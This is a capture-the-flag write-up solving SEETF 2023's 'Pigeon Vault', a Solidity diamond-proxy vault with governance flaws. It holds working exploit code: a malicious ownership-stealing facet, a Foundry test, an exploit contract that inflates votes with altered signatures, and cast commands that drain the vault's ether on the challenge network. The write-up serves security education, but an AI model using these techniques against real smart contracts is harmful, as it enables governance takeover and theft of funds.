# SEETF 2023 - Pigeon Vault [3 solves / 497 points]

### Description
```
rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system.

Find out a way to steal his funds before he discovers any flaws in his implementation.

Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/

nc win.the.seetf.sg 8552
```

I solved this challenge with the intended solution, but it has a much easier unintended solution because of a mistake in the setup contract, I discover the unintended solution after the CTF end when people told me in discord

Our goal is to become the owner of the diamond proxy, and drain ether from the diamond proxy
```solidity
    function isSolved() external view returns (bool) {
        return (IOwnershipFacet(address(pigeonDiamond)).owner() == msg.sender && msg.sender.balance >= 3000 ether);
    }
```

This contract is using the diamond proxy pattern

https://eips.ethereum.org/EIPS/eip-2535

And in the setup contract, we are allowed to claim 10000 ether of token for once 

However, it did not set claimed to true, which cause the unintended solution of keep calling claim()

But I will just do this challenge in the intended way

```
    function claim() external {
        require(!claimed, "You already claimed");

        bool success = IERC20(address(pigeonDiamond)).transfer(msg.sender, 10_000 ether);
        require(success, "Failed to send");
    }
```

In PigeonVaultFacet, it has an emergencyWithdraw() function, which allows the owner to drain the contract

```solidity
    function emergencyWithdraw() public {
        LibDiamond.enforceIsContractOwner();
        address owner = LibDiamond.contractOwner();
        (bool success,) = payable(address(owner)).call{value: address(this).balance}("");
        require(success, "PigeonVaultFacet: emergency withdraw failed");
    }
```

So our goal is just to become the owner, and when we are the owner, we can just drain it with this


The FeatherCoinFacet is for the FTC token, and it has delegate logic

At first, I tried the double spending bug, by delegate a contract and transfer my tokens to another address and delegate again, but that does not work, because it will remove the delegate when transfer/transferFrom is called

```solidity
    function transfer(address _to, uint256 _amount) external returns (bool) {
        s.balances[msg.sender] -= _amount;

        unchecked {
            s.balances[_to] += _amount;
        }

        _moveDelegates(s.delegates[msg.sender], s.delegates[_to], _amount);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool) {
        uint256 allowed = s.allowances[_from][msg.sender];

        if (allowed != type(uint256).max) {
            s.allowances[_from][msg.sender] = allowed - _amount;
        }

        s.balances[_from] -= _amount;

        unchecked {
            s.balances[_to] += _amount;
        }

        _moveDelegates(s.delegates[_from], s.delegates[_to], _amount);

        return true;
    }
```

In DAOFacet, we can submit and execute a proposal to add a facet, if we can add a malicious facet with it, we can become the owner when the diamond delegate call to our malicious facet

```solidity
    function submitProposal(address _target, bytes memory _callData, IDiamondCut.FacetCut memory _facetDetails)
        external
        returns (uint256 proposalId)
    {
        require(
            msg.sender == LibDiamond.contractOwner() || isUserGovernance(msg.sender), "DAOFacet: Must be contract owner"
        );
        proposalId = LibDAO.submitProposal(_target, _callData, _facetDetails);
    }

    function executeProposal(uint256 _proposalId) external {
        Proposal storage proposal = s.proposals[_proposalId];
        require(!proposal.executed, "DAOFacet: Already executed.");
        require(block.number >= proposal.endBlock, "DAOFacet: Too early.");
        require(
            proposal.forVotes > proposal.againstVotes && proposal.forVotes > (s.totalSupply / 10),
            "DAOFacet: Proposal failed."
        );
        proposal.executed = true;

        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);

        cut[0] = IDiamondCut.FacetCut({
            facetAddress: proposal.target,
            action: proposal.facetDetails.action,
            functionSelectors: proposal.facetDetails.functionSelectors
        });

        LibDiamond.diamondCut(cut, proposal.target, proposal.callData);
    }
```

But in order to submit a proposal, we have to either be the owner or isUserGovernance() of us need to be true
```solidity
        require(
            msg.sender == LibDiamond.contractOwner() || isUserGovernance(msg.sender), "DAOFacet: Must be contract owner"
        );
```

But the isUserGovernance() function has bug
```
    function isUserGovernance(address _user) internal view returns (bool) {
        uint256 totalSupply = s.totalSupply;
        uint256 userBalance = LibDAO.getCurrentVotes(_user);
        uint256 threshold = (userBalance * 100) / totalSupply;
        return userBalance >= threshold;
    }
```

As long as totalSupply >= 100, it will be true, and the totalSupply is 1000000 ether, so it is always true

So even the double spending bug doesn't work, it doesn't matter, we can submit proposal to add our malicious facet anyway

But after we submit the proposal, we still need to vote for it in order to execute it

```solidity
    function executeProposal(uint256 _proposalId) external {
        Proposal storage proposal = s.proposals[_proposalId];
        require(!proposal.executed, "DAOFacet: Already executed.");
        require(block.number >= proposal.endBlock, "DAOFacet: Too early.");
        require(
            proposal.forVotes > proposal.againstVotes && proposal.forVotes > (s.totalSupply / 10),
            "DAOFacet: Proposal failed."
        );
        proposal.executed = true;

        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](1);

        cut[0] = IDiamondCut.FacetCut({
            facetAddress: proposal.target,
            action: proposal.facetDetails.action,
            functionSelectors: proposal.facetDetails.functionSelectors
        });

        LibDiamond.diamondCut(cut, proposal.target, proposal.callData);
    }
```

forVotes need to be larger than againstVotes and forVotes need to be larger than totalSupply/10

Total supply is 1000000 ether, so forVotes need to be > 100000

Also, it can be executed only if it reaches the proposal.endBlock, which is 6 blocks after the submission

We can use castVoteBySig() to vote 
```solidity
    function castVoteBySig(uint256 _proposalId, bool _support, bytes memory _sig) external {
        address signer = ECDSA.recover(keccak256("\x19Ethereum Signed Message:\n32"), _sig);
        require(signer != address(0), "DAOFacet: Invalid signature.");
        _vote(_sig, _proposalId, _support);
    }

    function _vote(bytes memory _sig, uint256 _proposalId, bool _support) internal {
        Proposal storage proposal = s.proposals[_proposalId];
        require(LibDAO.getPriorVotes(msg.sender, proposal.startBlock) >= s.voteThreshold, "DAOFacet: Not enough.");
        require(block.number <= s.proposals[_proposalId].endBlock, "DAOFacet: Too late.");
        bool hasVoted = proposal.receipts[_sig];
        require(!hasVoted, "DAOFacet: Already voted.");
        uint256 votes = LibDAO.getPriorVotes(msg.sender, proposal.startBlock);

        if (_support) {
            proposal.forVotes += votes;
        } else {
            proposal.againstVotes += votes;
        }

        proposal.receipts[_sig] = true;
    }
```

It's taking a signature, but it just check that the result of ecrecover of it is not address(0), and it is not used in `_vote()`, so the signature doesn't matter as long as ecrecover does not return address(0)

It will check if the signature is used for vote before, but we can just sign a valid signature, then even the message hash and `s` of the signature is changed, ecrecover will just return a somewhat random address, but not address(0), and the signature will be different every time, so we can vote as many times as we want

We can just use vm.sign() in foundry to sign with random private key
```solidity
        (uint8 sig_v, bytes32 sig_r, bytes32 sig_s) = vm.sign(1337, keccak256(abi.encodePacked("kaiziron")));
        console.log("v, r, s :");
        console.log(sig_v);
        console.logBytes32(sig_r);
        console.logBytes32(sig_s);
```
```
v, r, s :
27
0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc0
0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b28
```

Even I changed the message hash and s of the signature, it will still return an address that is not address(0)
```
➜ ecrecover(keccak256("\x19Ethereum Signed Message:\n32"), 27, 0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc0, 0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b28)
Type: address
└ Data: 0x94850bf894ac067d9943566f3b65f734d4cb0392

➜ ecrecover(keccak256("\x19Ethereum Signed Message:\n32"), 27, 0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc0, 0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b27)
Type: address
└ Data: 0x91fe6db27acbedd14b7262d2b891fb74522551f2
```

But if we change r of the signature, it will return address(0), so just change s
```
➜ ecrecover(keccak256("\x19Ethereum Signed Message:\n32"), 27, 0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc1, 0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b28)
Type: address
└ Data: 0x0000000000000000000000000000000000000000
```

It will call getPriorVotes() to determine how many votes we can add

We have 10000 ether of FTC token, so just call delegate() to delegate ourselves
```solidity
    function delegate(address _delegatee) public {
        return _delegate(msg.sender, _delegatee);
    }
```

Then wait for one block after delegate(), then getPriorVotes() will return 10000 ether of votes

It will check to see it is larger or equal to the threshold, which is set in InitDiamond
```
        s.voteThreshold = 10_000 ether;
```

We excatly have enough votes to vote, and it will check that it's before endBlock of the proposal, so we have to vote before 6 blocks after the submission of the proposal

We have 10000 ether of votes, and we just need 100000 votes, so just vote for many times with different signature that ecrecover won't return address(0)

After our malicious proposal has enough votes, just wait until 6 blocks after the submission, then we can execute it, and our malicious facet can be added to the diamond

So I will test it with foundry test first, and I found an issue in executeProposal()

I submit the proposal with this :
```solidity
uint256 proposalId = DAOFacet(pigeonDiamond).submitProposal(address(0), hex"", IDiamondCut.FacetCut(address(exploit), IDiamondCut.FacetCutAction.Add, selectors));
```

It gives error that the facet address is address(0), but I just put address(0) as the target address that is used to initialize the facet, and if it's address(0) it won't initialize

The issue is in executeProposal()
```solidity
        cut[0] = IDiamondCut.FacetCut({
            facetAddress: proposal.target,
            action: proposal.facetDetails.action,
            functionSelectors: proposal.facetDetails.functionSelectors
        });
```

It set the facetAddress to be proposal.target, but it should be proposal.facetDetails.facetAddress instead

So the facet address is ignored and target address is set for both facetAddress and target

So just set both to the exploit facet contract's address
```solidity
uint256 proposalId = DAOFacet(pigeonDiamond).submitProposal(address(exploit), hex"", IDiamondCut.FacetCut(address(exploit), IDiamondCut.FacetCutAction.Add, selectors));
```

And add a receive() function in the exploit facet contract
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {LibDiamond} from "./libraries/LibDiamond.sol";

contract ExploitFacet {
    function becomeOwner() public {
        LibDiamond.setContractOwner(msg.sender);
    }
    
    receive() external payable {}
}
```

### Foundry test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/ExploitFacet.sol";

contract vaultTest is Test {
    Setup public setup_contract;
    address public pigeonDiamond;
    address public attacker;
    address public attacker2;    
    ExploitFacet public exploit;

    function setUp() public {
        setup_contract = new Setup{value: 3000 ether}();
        pigeonDiamond = address(setup_contract.pigeonDiamond());
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        attacker2 = makeAddr("attacker2");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        console.log("setup address :", address(setup_contract));
        console.log("attacker address :", attacker);
        console.log("pigeonDiamond balance :", pigeonDiamond.balance);
        console.log("attacker balance :", attacker.balance);
        console.log("diamond owner :", OwnershipFacet(pigeonDiamond).owner());
        //claim 10000 FTC from setup
        console.log("Claiming FTC from setup...");
        setup_contract.claim();
        console.log("FTC balance of attacker :", FeatherCoinFacet(pigeonDiamond).balanceOf(attacker));
        console.log("FTC balance of setup :", FeatherCoinFacet(pigeonDiamond).balanceOf(address(setup_contract)));
        console.log("FTC totalSupply :", FeatherCoinFacet(pigeonDiamond).totalSupply());
        
        
        exploit = new ExploitFacet();
        
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = bytes4(ExploitFacet.becomeOwner.selector);
        uint256 proposalId = DAOFacet(pigeonDiamond).submitProposal(address(exploit), hex"", IDiamondCut.FacetCut(address(exploit), IDiamondCut.FacetCutAction.Add, selectors));
        
        console.log("Proposal ID for exploit facet :", proposalId);
        
        
        FeatherCoinFacet(pigeonDiamond).delegate(attacker);
        vm.roll(block.number + 1);
        console.log("Attacker votes :", FeatherCoinFacet(pigeonDiamond).getCurrentVotes(attacker));
        console.log("getPriorVotes(attacker, block.number - 1) :", FeatherCoinFacet(pigeonDiamond).getPriorVotes(attacker, block.number - 1));
        
        (uint8 sig_v, bytes32 sig_r, bytes32 sig_s) = vm.sign(1337, keccak256(abi.encodePacked("kaiziron")));
        console.log("v, r, s :");
        console.log(sig_v);
        console.logBytes32(sig_r);
        console.logBytes32(sig_s);
        
        for (uint i; i < 100; ++i) {
            bytes memory sig = abi.encodePacked(sig_r, sig_s, sig_v);
            //console.logBytes(sig);
            DAOFacet(pigeonDiamond).castVoteBySig(proposalId, true, sig);
            sig_s = bytes32(uint256(sig_s)+1);
        }
        vm.roll(block.number + 6);
        DAOFacet(pigeonDiamond).executeProposal(proposalId);
        
        ExploitFacet(payable(pigeonDiamond)).becomeOwner();
        PigeonVaultFacet(pigeonDiamond).emergencyWithdraw();
        
        console.log("pigeonDiamond owner :", IOwnershipFacet(address(pigeonDiamond)).owner());
        console.log("attacker ether balance :", attacker.balance);
        console.log("isSolved() :", setup_contract.isSolved());
    }
}
```

```
# forge test --match-path test/vault.t.sol -vv
[⠊] Compiling...
[⠒] Compiling 1 files with 0.8.20
[⠢] Solc 0.8.20 finished in 4.02s
Compiler run successful!

Running 1 test for test/vault.t.sol:vaultTest
[PASS] testExploit() (gas: 3935678)
Logs:
  setup address : 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  attacker address : 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  pigeonDiamond balance : 3000000000000000000000
  attacker balance : 10000000000000000000
  diamond owner : 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  Claiming FTC from setup...
  FTC balance of attacker : 10000000000000000000000
  FTC balance of setup : 990000000000000000000000
  FTC totalSupply : 1000000000000000000000000
  Proposal ID for exploit facet : 0
  Attacker votes : 10000000000000000000000
  getPriorVotes(attacker, block.number - 1) : 10000000000000000000000
  v, r, s :
  27
  0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc0
  0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b28
  pigeonDiamond owner : 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  attacker ether balance : 3010000000000000000000
  isSolved() : true

Test result: ok. 1 passed; 0 failed; finished in 29.24ms
```

It works, so just exploit it on the actual challenge network

### Exploit contract
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "../src/Setup.sol";
import "../src/ExploitFacet.sol";

contract Exploit {
    Setup public setup_contract;
    address public pigeonDiamond;
    ExploitFacet public exploit;
    uint256 public proposalId;
    
    constructor(address _setup) {
        setup_contract = Setup(_setup);
        pigeonDiamond = address(setup_contract.pigeonDiamond());
    }
    
    function exploit1() public {
        setup_contract.claim();
        exploit = new ExploitFacet();
        
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = bytes4(ExploitFacet.becomeOwner.selector);
        proposalId = DAOFacet(pigeonDiamond).submitProposal(address(exploit), hex"", IDiamondCut.FacetCut(address(exploit), IDiamondCut.FacetCutAction.Add, selectors));
        
        FeatherCoinFacet(pigeonDiamond).delegate(address(this));
        // wait for 1 block, then call exploit2()
    }
    
    function exploit2() public {
        //(uint8 sig_v, bytes32 sig_r, bytes32 sig_s) = vm.sign(1337, keccak256(abi.encodePacked("kaiziron")));
        //console.log("v, r, s :");
        //console.log(sig_v);
        //console.logBytes32(sig_r);
        //console.logBytes32(sig_s);
        uint8 sig_v = uint8(27);
        bytes32 sig_r = bytes32(0x987faeb9c51477cccee2867916547eaabbdad70489f2269ccf92a9bbf9d35cc0);
        bytes32 sig_s = bytes32(0x3b1ae5d44573c6a572c750f6eef7ebba3430cb2c34afb0635cc5b08b91274b28);
        
        for (uint i; i < 100; ++i) {
            bytes memory sig = abi.encodePacked(sig_r, sig_s, sig_v);
            DAOFacet(pigeonDiamond).castVoteBySig(proposalId, true, sig);
            sig_s = bytes32(uint256(sig_s)+1);
        }
        // wait for 6 blocks after submission, then do these in EOA:
        //DAOFacet(pigeonDiamond).executeProposal(proposalId);
        //ExploitFacet(payable(pigeonDiamond)).becomeOwner();
        //PigeonVaultFacet(pigeonDiamond).emergencyWithdraw();
    }
}
```

First just deploy the exploit contract
```
# forge create ./src/Exploit.sol:Exploit --constructor-args 0x3e0B37296BE0147dCAee55A1968908AD2080c303 --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
[⠃] Compiling...
No files changed, compilation skipped
Deployer: 0x799046Bb7CF9c2308Ed77B0B068F1Cc697219127
Deployed to: 0x1786410938B5137639D090c6774faFB99CbBF892
Transaction hash: 0xd50dac3175e73670a86e1b5757cc0810ceaef22112de9e6d0bfc4bc117c85c8d
```

Then just call exploit1() :
```
cast send 0x1786410938B5137639D090c6774faFB99CbBF892 "exploit1()" --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
```

Then wait for 1 block and call exploit2() :
```
cast send 0x1786410938B5137639D090c6774faFB99CbBF892 "exploit2()" --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
```

Then wait for 6 blocks after the submission and execute the proposal and call becomeOwner() to become the owner of the diamond

Finally just call emergencyWithdraw() as the owner to drain it


get pigeonDiamond address :
```
# cast call 0x1786410938B5137639D090c6774faFB99CbBF892 "pigeonDiamond()(address)" --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
0xDe8ca44028e4F4EDd75612fD33D19F78838FA4E9
```
and proposalId :
```
# cast call 0x1786410938B5137639D090c6774faFB99CbBF892 "proposalId()(uint256)" --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
0
```

Execute proposal :
```
# cast send 0xDe8ca44028e4F4EDd75612fD33D19F78838FA4E9 "executeProposal(uint256)" 0 --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
```

Become owner :
```
# cast send 0xDe8ca44028e4F4EDd75612fD33D19F78838FA4E9 "becomeOwner()" --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
```

Emergency withdraw :
```
# cast send 0xDe8ca44028e4F4EDd75612fD33D19F78838FA4E9 "emergencyWithdraw()" --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
```

Then call isSolved() in setup contract to confirm it is solved :
```
# cast call 0x3e0B37296BE0147dCAee55A1968908AD2080c303 "isSolved()(bool)" --private-key <key> --rpc-url http://win.the.seetf.sg:8551/ce9c5082-29fb-4a36-b0d0-65726fb741c2
true
```

```
# nc win.the.seetf.sg 8552
1 - launch new instance
2 - kill instance
3 - acquire flag
action? 3
uuid please: ce9c5082-29fb-4a36-b0d0-65726fb741c2

Congratulations! You have solve it! Here's the flag: 
SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n't_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}
```